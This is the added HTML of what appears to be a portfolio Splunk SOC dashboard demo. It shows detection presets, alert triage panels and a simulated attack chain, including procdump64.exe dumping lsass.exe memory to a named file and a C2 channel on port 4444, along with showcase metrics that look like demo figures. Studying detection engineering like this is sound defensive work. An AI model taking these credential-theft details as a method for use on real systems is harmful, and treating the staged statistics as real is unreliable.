@@ -1,0 +1,1621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Splunk SIEM Enterprise SOC Platform | Detection Engineering & Threat Triage</title>
+  <meta name="description" content="Production-grade Splunk SIEM Detection Engineering and SOC L1/L2 Incident Triage Platform featuring real-time SPL engine, MITRE ATT&CK matrix, and correlation dashboards.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="index.css">
+</head>
+<body class="theme-settled-slate">
+  <!-- Top Navigation & Header Bar -->
+  <header class="soc-header" id="main-header">
+    <div class="soc-brand">
+      <div class="brand-logo-glow">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" class="shield-icon">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          <path d="m9 12 2 2 4-4"/>
+        </svg>
+      </div>
+      <div class="brand-text">
+        <div class="brand-title">SPLUNK <span class="accent-text">ENTERPRISE SOC</span></div>
+        <div class="brand-subtitle">Detection Engineering & Alert Correlation Lab</div>
+      </div>
+    </div>
+
+    <!-- Live Telemetry Status Badges -->
+    <div class="soc-telemetry-bar">
+      <div class="telemetry-item" title="Splunk Universal Forwarders connected">
+        <span class="status-dot pulse-green"></span>
+        <span class="telemetry-label">FWD:</span>
+        <span class="telemetry-value" id="forwarders-count">42 ACTIVE</span>
+      </div>
+      <div class="telemetry-item" title="Events Ingested Per Second">
+        <span class="telemetry-icon">⚡</span>
+        <span class="telemetry-label">INGEST:</span>
+        <span class="telemetry-value" id="eps-counter">1,420 EPS</span>
+      </div>
+      <div class="telemetry-item" title="Correlation Searches Running">
+        <span class="telemetry-icon">🛡️</span>
+        <span class="telemetry-label">RULES:</span>
+        <span class="telemetry-value">6 PROD</span>
+      </div>
+      <div class="telemetry-item highlight-tuning" title="Tuning Noise Reduction">
+        <span class="telemetry-icon">📉</span>
+        <span class="telemetry-label">FP NOISE:</span>
+        <span class="telemetry-value highlight-cyan">-35.2%</span>
+      </div>
+    </div>
+
+    <!-- Right Controls -->
+    <div class="soc-header-controls">
+      <button class="btn btn-sm btn-guide-toggle active" id="btn-toggle-guide" title="Toggle First-Time Help Guides and Tips">
+        <span>💡 Guide: <strong id="guide-status-text">ON</strong></span>
+      </button>
+      <button class="btn btn-sm btn-theme-toggle" id="btn-toggle-theme" title="Toggle Theme (Settled Slate / Clean Light)">
+        <span id="theme-toggle-icon">☀️</span>
+        <span id="theme-toggle-label">Light</span>
+      </button>
+      <a href="reports/Project_Architecture_and_Guide_Printable.html" target="_blank" class="btn btn-sm btn-primary" id="btn-open-arch-guide" title="Open Complete Project Architecture & Methodology PDF Guide">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>
+        <span>Architecture PDF</span>
+      </a>
+      <button class="btn btn-sm btn-outline-cyan" id="btn-export-incident" title="Export SOC Incident Report">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        <span>Incident Report</span>
+      </button>
+    </div>
+  </header>
+
+  <!-- Main Container with Sidebar + Content -->
+  <div class="soc-layout-container">
+    <!-- Left Navigation Sidebar -->
+    <aside class="soc-sidebar" id="sidebar-nav">
+      <div class="nav-section-title">SOC OPERATIONS</div>
+      <ul class="nav-menu">
+        <li class="nav-item active" data-tab="dashboard-overview" id="nav-dashboard">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/></svg>
+          <span>Executive SOC Overview</span>
+        </li>
+        <li class="nav-item" data-tab="spl-search-engine" id="nav-spl-search">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/><path d="m8 11 2 2 4-4"/></svg>
+          <span>SPL Search & Engine</span>
+          <span class="badge-pill pulse-pill">LIVE</span>
+        </li>
+        <li class="nav-item" data-tab="alert-triage-queue" id="nav-triage">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          <span>Alert Triage & Escalation</span>
+          <span class="badge-pill bg-danger" id="badge-open-alerts">5 OPEN</span>
+        </li>
+        <li class="nav-item" data-tab="log-uploader-analyzer" id="nav-upload-analyzer">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+          <span>Log Ingest & Threat Analyzer</span>
+          <span class="badge-pill pulse-pill">NEW</span>
+        </li>
+      </ul>
+
+      <div class="nav-section-title">DETECTION DASHBOARDS</div>
+      <ul class="nav-menu">
+        <li class="nav-item" data-tab="brute-force-dashboard" id="nav-brute-force">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <span>4625 Brute Force & Spray</span>
+        </li>
+        <li class="nav-item" data-tab="process-tree-dashboard" id="nav-process-tree">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>
+          <span>Macro & Process Tree</span>
+        </li>
+        <li class="nav-item" data-tab="lsass-credential-dashboard" id="nav-lsass">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-1-1l-3 3m1 1l-2 2m-1-1l-4 4a5 5 0 1 1-7-7l4-4m1 1l2-2m-1-1l3-3m1 1l2-2"/></svg>
+          <span>LSASS Credential Access</span>
+        </li>
+        <li class="nav-item" data-tab="network-beacon-dashboard" id="nav-c2-beacon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
+          <span>C2 Network Beaconing</span>
+        </li>
+      </ul>
+
+      <div class="nav-section-title">FRAMEWORKS & TUNING</div>
+      <ul class="nav-menu">
+        <li class="nav-item" data-tab="mitre-matrix-view" id="nav-mitre">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m4.93 4.93 4.24 4.24"/><path d="m14.83 9.17 4.24-4.24"/><path d="m14.83 14.83 4.24 4.24"/><path d="m9.17 14.83-4.24 4.24"/></svg>
+          <span>MITRE ATT&CK Matrix</span>
+        </li>
+        <li class="nav-item" data-tab="fp-tuning-sandbox" id="nav-tuning">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" y1="21" x2="4" y2="14"/><line x1="4" y1="10" x2="4" y2="3"/><line x1="12" y1="21" x2="12" y2="12"/><line x1="12" y1="8" x2="12" y2="3"/><line x1="20" y1="21" x2="20" y2="16"/><line x1="20" y1="12" x2="20" y2="3"/><line x1="1" y1="14" x2="7" y2="14"/><line x1="9" y1="8" x2="15" y2="8"/><line x1="17" y1="16" x2="23" y2="16"/></svg>
+          <span>FP Tuning Sandbox</span>
+        </li>
+      </ul>
+
+      <!-- Resume Quick Info Box -->
+      <div class="sidebar-portfolio-card">
+        <div class="card-tag">PORTFOLIO SHOWCASE</div>
+        <div class="card-heading">Enterprise Splunk Engineering</div>
+        <p class="card-desc">Windows 4625/4104 + Sysmon 1/3/10 correlation, Sigma conversions & NIST IR playbooks.</p>
+        <a href="#spl-search-engine" class="link-cyan" id="quick-spl-link">Run Live SPL Searches &rarr;</a>
+      </div>
+    </aside>
+
+    <!-- Main Dynamic Content Body -->
+    <main class="soc-main-content">
+
+      <!-- =================================================================== -->
+      <!-- GLOBAL FIRST-TIME ROLE ONBOARDING BANNER -->
+      <!-- =================================================================== -->
+      <div class="role-onboarding-banner" id="onboarding-banner">
+        <div class="onboarding-content">
+          <div class="onboarding-header-row">
+            <div class="onboarding-badge-wrap">
+              <span class="badge-role-tag">👋 FIRST-TIME VISITOR GUIDE</span>
+              <span class="onboarding-sub">Select your persona to tailor the guided interview highlights:</span>
+            </div>
+            <button class="btn-dismiss-banner" id="btn-dismiss-onboarding" title="Dismiss Guide">Skip Guide ✕</button>
+          </div>
+          
+          <div class="role-chips-grid">
+            <button class="role-chip active" data-role="recruiter" id="chip-recruiter">
+              <span class="chip-icon">👔</span>
+              <div class="chip-text">
+                <strong>Recruiter & Hiring Manager</strong>
+                <small>Highlights: -35.2% Noise Reduction, ROI & Metrics</small>
+              </div>
+            </button>
+            <button class="role-chip" data-role="analyst" id="chip-analyst">
+              <span class="chip-icon">🛡️</span>
+              <div class="chip-text">
+                <strong>SOC Analyst (L1 / L2)</strong>
+                <small>Highlights: Alert Triage, NIST Playbooks & IR Escalation</small>
+              </div>
+            </button>
+            <button class="role-chip" data-role="engineer" id="chip-engineer">
+              <span class="chip-icon">⚙️</span>
+              <div class="chip-text">
+                <strong>Detection Engineer</strong>
+                <small>Highlights: SPL Rules, Sigma YAML & Sysmon Configs</small>
+              </div>
+            </button>
+          </div>
+
+          <!-- Dynamic Persona Callout Message -->
+          <div class="role-focus-message" id="role-focus-message">
+            <div class="focus-icon">💡</div>
+            <div class="focus-body" id="role-focus-text">
+              <div style="display: flex; flex-direction: column; gap: 0.5rem;">
+                <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.4rem;">
+                  <span style="font-size: 0.86rem; color: #ffffff; font-weight: 700;">👔 Recruiter & Hiring Manager Focused Briefing:</span>
+                  <span class="badge-tag highlight-green">Key Metric: -35.2% Alert Noise Reduction</span>
+                </div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); gap: 0.6rem; margin-top: 0.2rem;">
+                  <div style="background: rgba(8, 34, 60, 0.6); padding: 0.5rem 0.75rem; border-radius: 6px; border: 1px solid var(--border-color);">
+                    <strong class="text-cyan" style="font-size: 0.76rem; display: block;">1. Measurable Business Impact</strong>
+                    <span style="font-size: 0.72rem; color: var(--text-muted);">Suppressed 500 noise alerts/week saving ~15 engineering hours/week.</span>
+                  </div>
+                  <div style="background: rgba(8, 34, 60, 0.6); padding: 0.5rem 0.75rem; border-radius: 6px; border: 1px solid var(--border-color);">
+                    <strong class="text-green" style="font-size: 0.76rem; display: block;">2. Triage Speed Acceleration</strong>
+                    <span style="font-size: 0.72rem; color: var(--text-muted);">Cut Mean Time to Triage (MTTT) from 14.2 min down to 4.1 min.</span>
+                  </div>
+                  <div style="background: rgba(8, 34, 60, 0.6); padding: 0.5rem 0.75rem; border-radius: 6px; border: 1px solid var(--border-color);">
+                    <strong class="text-mint" style="font-size: 0.76rem; display: block;">3. SIEM Technical Depth</strong>
+                    <span style="font-size: 0.72rem; color: var(--text-muted);">Splunk Enterprise ES, Sigma YAML rules, and Sysmon XML deployments.</span>
+                  </div>
+                  <div style="background: rgba(8, 34, 60, 0.6); padding: 0.5rem 0.75rem; border-radius: 6px; border: 1px solid var(--border-color);">
+                    <strong class="text-amber" style="font-size: 0.76rem; display: block;">4. Industry Frameworks</strong>
+                    <span style="font-size: 0.72rem; color: var(--text-muted);">Full alignment with MITRE ATT&CK Matrix v14 & NIST 800-61 playbooks.</span>
+                  </div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.5rem; margin-top: 0.2rem; font-size: 0.72rem; color: var(--text-dim); flex-wrap: wrap;">
+                  <span>Recommended Tabs to Review:</span>
+                  <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-dashboard').click()">Executive Overview</button>
+                  <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-tuning').click()">FP Tuning Sandbox</button>
+                  <a href="reports/Project_Architecture_and_Guide_Printable.html" target="_blank" class="btn btn-sm btn-primary">Open Architecture PDF</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- =================================================================== -->
+      <!-- TAB 1: EXECUTIVE SOC OVERVIEW -->
+      <!-- =================================================================== -->
+      <section class="tab-pane active" id="dashboard-overview">
+        <!-- Interactive Help Box -->
+        <div class="help-box" id="help-overview">
+          <div class="help-header">
+            <div class="help-title">
+              <span class="help-icon">💡</span>
+              <strong>First-Time Guide: What you're seeing in this view</strong>
+            </div>
+            <button class="btn-hide-help" onclick="toggleHelpBox('help-overview')">Hide ✕</button>
+          </div>
+          <div class="help-body">
+            <div class="help-step-item">
+              <span class="step-num">1</span>
+              <span><strong>Real-Time Telemetry:</strong> Ingesting Windows Security Event Logs (4625/4624) and Sysmon across 42 endpoints at 1,420 EPS.</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">2</span>
+              <span><strong>Correlated Threat Banner:</strong> Highlights the 5-stage attack chain discovered by our custom SPL correlation rules.</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">3</span>
+              <span><strong>Quick Action:</strong> Click <em>"Inspect Process Kill Chain"</em> below or switch to the <em>"SPL Search & Engine"</em> tab in the sidebar.</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Top Metric KPI Cards -->
+        <div class="kpi-grid">
+          <div class="kpi-card kpi-critical">
+            <div class="kpi-header">
+              <span class="kpi-title">CRITICAL INCIDENTS</span>
+              <span class="kpi-icon">🚨</span>
+            </div>
+            <div class="kpi-value" id="kpi-critical-val">2</div>
+            <div class="kpi-trend trend-down"><span>↑</span> Phishing Macro & LSASS Dump</div>
+          </div>
+          <div class="kpi-card kpi-high">
+            <div class="kpi-header">
+              <span class="kpi-title">AUTH ATTACKS (4625)</span>
+              <span class="kpi-icon">🔐</span>
+            </div>
+            <div class="kpi-value" id="kpi-auth-val">11 Fails / 1 Spray</div>
+            <div class="kpi-trend trend-neutral">Targeted: 8 User Accounts</div>
+          </div>
+          <div class="kpi-card kpi-info">
+            <div class="kpi-header">
+              <span class="kpi-title">CORRELATED LOG SOURCES</span>
+              <span class="kpi-icon">🗄️</span>
+            </div>
+            <div class="kpi-value">4 Indices</div>
+            <div class="kpi-trend trend-up">WinSecurity, Sysmon, PS4104, Zeek</div>
+          </div>
+          <div class="kpi-card kpi-success">
+            <div class="kpi-header">
+              <span class="kpi-title">FALSE POSITIVE REDUCTION</span>
+              <span class="kpi-icon">🎯</span>
+            </div>
+            <div class="kpi-value">35.2%</div>
+            <div class="kpi-trend trend-up"><span>↓</span> Whitelist + Sliding Windows</div>
+          </div>
+        </div>
+
+        <!-- Threat Architecture Banner -->
+        <div class="glass-panel banner-panel">
+          <div class="banner-content">
+            <div class="badge-tag">ACTIVE DETECTION PIPELINE</div>
+            <h2 class="banner-title">Multi-Stage Lateral Threat Detected & Correlated Across Windows Telemetry</h2>
+            <p class="banner-desc">
+              Splunk correlation engine identified a 5-phase attack chain: External Password Spraying (T1110) &rarr; Compromised User Account `CORP\cjohnson` &rarr; Weaponized Macro Execution (T1204.002) &rarr; Memory Dump via `procdump64.exe` on `lsass.exe` (T1003.001) &rarr; C2 Channel over Port 4444 (T1071.001).
+            </p>
+            <div class="banner-actions">
+              <button class="btn btn-primary" id="btn-inspect-killchain">Inspect Process Kill Chain &rarr;</button>
+              <button class="btn btn-secondary" id="btn-view-alerts">View Triage Queue</button>
+              <button class="btn btn-outline" id="btn-open-playbook">Open NIST Playbook</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- 2 Column Chart & Summary Grid -->
+        <div class="grid-2col">
+          <!-- Live Alert Distribution -->
+          <div class="glass-panel">
+            <div class="panel-header">
+              <div class="panel-title">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                <span>Recent Correlation Search Detections</span>
+              </div>
+              <span class="panel-badge">Last 60 Minutes</span>
+            </div>
+            <div class="table-responsive">
+              <table class="soc-table" id="table-overview-alerts">
+                <thead>
+                  <tr>
+                    <th>Severity</th>
+                    <th>Alert Name / Rule</th>
+                    <th>Target Host / User</th>
+                    <th>MITRE ATT&CK</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody id="overview-alert-rows">
+                  <!-- Populated dynamically via JS -->
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <!-- Detection Tuning & Metrics Card -->
+          <div class="glass-panel">
+            <div class="panel-header">
+              <div class="panel-title">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
+                <span>Detection Fidelity & Tuning Impact</span>
+              </div>
+              <span class="panel-badge highlight-green">Tuned Production</span>
+            </div>
+            <div class="tuning-metric-body">
+              <div class="metric-row">
+                <div class="metric-info">
+                  <span class="metric-name">Pre-Tuning Weekly Alert Volume</span>
+                  <span class="metric-sub">Raw unfiltered 4625 & Sysmon events</span>
+                </div>
+                <span class="metric-val text-muted">1,420 / wk</span>
+              </div>
+              <div class="progress-bar-bg">
+                <div class="progress-bar-fill fill-red" style="width: 100%;"></div>
+              </div>
+
+              <div class="metric-row mt-3">
+                <div class="metric-info">
+                  <span class="metric-name">Post-Tuning Engineered Volume</span>
+                  <span class="metric-sub">Whitelisted service accounts + 60s temporal aggregation</span>
+                </div>
+                <span class="metric-val text-green font-bold">920 / wk (-35.2%)</span>
+              </div>
+              <div class="progress-bar-bg">
+                <div class="progress-bar-fill fill-green" style="width: 64.8%;"></div>
+              </div>
+
+              <div class="tuning-highlights-grid mt-4">
+                <div class="tune-box">
+                  <span class="tune-num text-cyan">4.1 min</span>
+                  <span class="tune-lbl">Mean Triage Time (MTTT)</span>
+                </div>
+                <div class="tune-box">
+                  <span class="tune-num text-green">99.4%</span>
+                  <span class="tune-lbl">True Positive Fidelity</span>
+                </div>
+                <div class="tune-box">
+                  <span class="tune-num text-amber">18 min</span>
+                  <span class="tune-lbl">Mean Time to Contain</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- TAB 2: INTERACTIVE SPL SEARCH & ENGINE -->
+      <!-- =================================================================== -->
+      <section class="tab-pane" id="spl-search-engine">
+        <!-- Interactive Help Box -->
+        <div class="help-box" id="help-spl">
+          <div class="help-header">
+            <div class="help-title">
+              <span class="help-icon">💡</span>
+              <strong>First-Time Guide: How to use the Splunk SPL Search Engine</strong>
+            </div>
+            <button class="btn-hide-help" onclick="toggleHelpBox('help-spl')">Hide ✕</button>
+          </div>
+          <div class="help-body">
+            <div class="help-step-item">
+              <span class="step-num">1</span>
+              <span><strong>Pick a Preset:</strong> Click any of the pre-loaded detection rules below (e.g. <em>Rule 01: Event 4625 Brute Force</em>).</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">2</span>
+              <span><strong>Run or Modify:</strong> Click <em>"Execute Search"</em> to execute the SPL pipeline across our normalized Windows security logs.</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">3</span>
+              <span><strong>Interview Value:</strong> Proves hands-on ability with complex Splunk commands (`bin`, `stats`, `eval`, `where`, `inputlookup`).</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="glass-panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+              <span>Splunk Search Processing Language (SPL) Execution Engine</span>
+            </div>
+            <div class="spl-status-pill">
+              <span class="status-dot pulse-green"></span>
+              <span>INDEX: win_security, win_sysmon, ps_4104</span>
+            </div>
+          </div>
+
+          <!-- SPL Presets Selector -->
+          <div class="spl-preset-bar">
+            <span class="preset-label">Query Presets:</span>
+            <button class="btn-preset active" data-query-preset="bruteforce">Rule 01: Event 4625 Brute Force</button>
+            <button class="btn-preset" data-query-preset="macro">Rule 02: Office Spawning PowerShell</button>
+            <button class="btn-preset" data-query-preset="ps4104">Rule 03: PowerShell 4104 De-obfuscation</button>
+            <button class="btn-preset" data-query-preset="lsass">Rule 04: Sysmon 10 LSASS Dump</button>
+            <button class="btn-preset" data-query-preset="beacon">Rule 05: C2 Beacon Outbound</button>
+            <button class="btn-preset" data-query-preset="all">Show All Raw Telemetry</button>
+          </div>
+
+          <!-- Code Editor / SPL Search Bar -->
+          <div class="spl-editor-container">
+            <div class="spl-input-wrap">
+              <div class="spl-prompt-symbol">&gt;</div>
+              <textarea id="spl-query-input" rows="4" spellcheck="false" placeholder="Enter Splunk SPL query..."></textarea>
+            </div>
+            <div class="spl-actions-bar">
+              <div class="spl-syntax-hint">
+                <span class="token-keyword">index=</span><span class="token-str">win_security</span> | <span class="token-keyword">eval</span> ... | <span class="token-keyword">stats</span> count by TargetUserName | <span class="token-keyword">where</span> count &gt;= 10
+              </div>
+              <div class="spl-button-group">
+                <button class="btn btn-secondary btn-sm" id="btn-copy-spl" title="Copy SPL to clipboard">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                  <span>Copy SPL</span>
+                </button>
+                <button class="btn btn-primary" id="btn-run-spl">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                  <span>Execute Search</span>
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <!-- SPL Results Statistics Header -->
+          <div class="spl-results-meta" id="spl-results-meta">
+            <div class="meta-left">
+              <span class="meta-count" id="spl-count-display">Showing 12 matching events</span>
+              <span class="meta-timer" id="spl-timer-display">(Query latency: 14ms | 0 errors)</span>
+            </div>
+            <div class="meta-right">
+              <input type="text" id="spl-filter-results" class="search-input-sm" placeholder="Filter result columns...">
+            </div>
+          </div>
+
+          <!-- Dynamic Result Table -->
+          <div class="table-responsive spl-table-container">
+            <table class="soc-table soc-table-spl" id="spl-results-table">
+              <thead id="spl-table-head">
+                <!-- Dynamically generated based on SPL columns -->
+              </thead>
+              <tbody id="spl-table-body">
+                <!-- Dynamically rendered rows -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- TAB 3: ALERT TRIAGE & INCIDENT ESCALATION WORKBENCH -->
+      <!-- =================================================================== -->
+      <section class="tab-pane" id="alert-triage-queue">
+        <!-- Interactive Help Box -->
+        <div class="help-box" id="help-triage">
+          <div class="help-header">
+            <div class="help-title">
+              <span class="help-icon">💡</span>
+              <strong>First-Time Guide: SOC L1 Triage & Escalation Lifecycle</strong>
+            </div>
+            <button class="btn-hide-help" onclick="toggleHelpBox('help-triage')">Hide ✕</button>
+          </div>
+          <div class="help-body">
+            <div class="help-step-item">
+              <span class="step-num">1</span>
+              <span><strong>Select Alert:</strong> Click any alert on the left sidebar to inspect its indicators.</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">2</span>
+              <span><strong>Review Context:</strong> Check <em>Raw Event</em>, <em>Correlation Analysis</em>, and the <em>Remediation Checklist</em>.</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">3</span>
+              <span><strong>Escalate:</strong> Click <em>"⚡ Escalate to Tier-2 / Incident Ticket"</em> to open the official NIST incident dispatch modal.</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="grid-triage">
+          <!-- Alert List Sidebar -->
+          <div class="glass-panel triage-list-panel">
+            <div class="panel-header">
+              <div class="panel-title">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                <span>SOC Alert Inbox</span>
+              </div>
+              <div class="filter-pill-group">
+                <button class="triage-filter-btn active" data-filter="all">All</button>
+                <button class="triage-filter-btn" data-filter="Critical">Critical</button>
+                <button class="triage-filter-btn" data-filter="High">High</button>
+              </div>
+            </div>
+            
+            <div class="triage-alert-cards" id="triage-cards-container">
+              <!-- Rendered dynamically via JS -->
+            </div>
+          </div>
+
+          <!-- Detailed Alert Investigation Workbench -->
+          <div class="glass-panel triage-detail-panel" id="triage-detail-pane">
+            <!-- Selected Alert Detail Header -->
+            <div class="detail-header" id="detail-header-section">
+              <div class="detail-badge-row">
+                <span class="badge-severity badge-critical" id="detail-severity">CRITICAL (P1)</span>
+                <span class="detail-tag" id="detail-mitre-tag">MITRE: T1003.001</span>
+                <span class="detail-time" id="detail-time">2026-04-18 15:12:05 UTC</span>
+              </div>
+              <h2 class="detail-title" id="detail-title">LSASS Memory Dumping via Suspicious Process (procdump64.exe)</h2>
+              <div class="detail-entity-bar">
+                <div class="entity-item"><strong>Host:</strong> <span id="detail-host">FIN-WS-09.CORP.LOCAL</span></div>
+                <div class="entity-item"><strong>User:</strong> <span id="detail-user">CORP\cjohnson</span></div>
+                <div class="entity-item"><strong>Source IP:</strong> <span id="detail-src-ip">192.168.10.42</span></div>
+              </div>
+            </div>
+
+            <!-- Triage Actions Toolbar -->
+            <div class="triage-action-bar">
+              <button class="btn btn-success btn-sm" id="btn-tag-tp" title="Mark as confirmed True Positive">
+                <span>✓ Confirm True Positive</span>
+              </button>
+              <button class="btn btn-outline-amber btn-sm" id="btn-tag-fp" title="Tag as False Positive and send to tuning queue">
+                <span>✕ Tag False Positive</span>
+              </button>
+              <button class="btn btn-primary btn-sm" id="btn-escalate-ticket">
+                <span>⚡ Escalate to Tier-2 / Incident Ticket</span>
+              </button>
+              <button class="btn btn-outline-cyan btn-sm" id="btn-open-current-playbook">
+                <span>📖 View NIST Playbook</span>
+              </button>
+            </div>
+
+            <!-- Analysis Tabs: Raw Event | Correlation Details | Sigma Rule | Playbook -->
+            <div class="detail-tabs-bar">
+              <button class="detail-tab active" data-subtab="subtab-raw">Raw Splunk Event</button>
+              <button class="detail-tab" data-subtab="subtab-correlation">Correlation & Analysis</button>
+              <button class="detail-tab" data-subtab="subtab-sigma">Sigma Rule Equivalent</button>
+              <button class="detail-tab" data-subtab="subtab-remediation">Remediation Checklist</button>
+            </div>
+
+            <div class="detail-subtab-content active" id="subtab-raw">
+              <div class="code-box-header">
+                <span>Source: XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</span>
+                <button class="btn-copy-code" id="btn-copy-raw-event">Copy JSON</button>
+              </div>
+              <pre class="json-code-block" id="detail-raw-json">
+                <!-- Populated via JS -->
+              </pre>
+            </div>
+
+            <div class="detail-subtab-content" id="subtab-correlation">
+              <div class="correlation-analysis-box">
+                <h4 class="subtab-h4">Incident Context & Cross-Source Correlation</h4>
+                <p id="detail-correlation-desc">
+                  This alert was correlated with a prior <strong>Windows 4625 Password Spraying</strong> detection at 14:32 UTC and a subsequent <strong>PowerShell 4104 De-obfuscation event</strong>. The attacker leveraged compromised credentials for user `CORP\cjohnson`, spawned a download cradle via Word, and executed `procdump64.exe` with full memory read access (`0x1fffff`) targeting `lsass.exe`.
+                </p>
+                <div class="ioc-summary-grid">
+                  <div class="ioc-card">
+                    <span class="ioc-title">Target Process</span>
+                    <span class="ioc-val">C:\Windows\System32\lsass.exe</span>
+                  </div>
+                  <div class="ioc-card">
+                    <span class="ioc-title">Access Mask Requested</span>
+                    <span class="ioc-val text-red">0x1fffff (PROCESS_ALL_ACCESS)</span>
+                  </div>
+                  <div class="ioc-card">
+                    <span class="ioc-title">Generated Output File</span>
+                    <span class="ioc-val">C:\Windows\Temp\lsass.dmp</span>
+                  </div>
+                  <div class="ioc-card">
+                    <span class="ioc-title">Risk Assessment</span>
+                    <span class="ioc-val text-red">HIGH: All Domain Hashes Compromised</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="detail-subtab-content" id="subtab-sigma">
+              <div class="code-box-header">
+                <span>Sigma Rule: win_lsass_access_sysmon10.yml</span>
+                <button class="btn-copy-code" id="btn-copy-sigma">Copy YAML</button>
+              </div>
+              <pre class="yaml-code-block" id="detail-sigma-yaml">
+                <!-- Populated via JS -->
+              </pre>
+            </div>
+
